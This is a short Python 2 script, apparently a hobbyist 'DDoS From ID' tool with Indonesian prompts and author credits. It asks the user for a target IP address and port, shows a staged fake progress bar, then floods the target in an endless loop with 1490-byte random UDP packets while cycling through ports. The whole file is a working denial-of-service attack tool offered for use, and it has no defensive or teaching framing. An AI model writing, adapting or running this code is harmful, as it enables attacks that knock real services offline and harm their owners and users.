# mau recode ya?
#izin dulu, hargain author
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDoS From ID")
print
print "Author   : Mr.T1T4N"
print "YouTube : T1T4N TZY"
print "github   : https://github.com/WhoAmI-T1T4N"
print "Instagram : https://www.facebook.com/xd.f0rce"
print
ip = raw_input("Masukan IP Target : ")
port = input("Portnya Juga Bangkee  : ")

os.system("clear")
os.system("figlet Sedang Menyerang")
print "[                    ] 0% "
time.sleep(5)
print "[====               ] 35%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
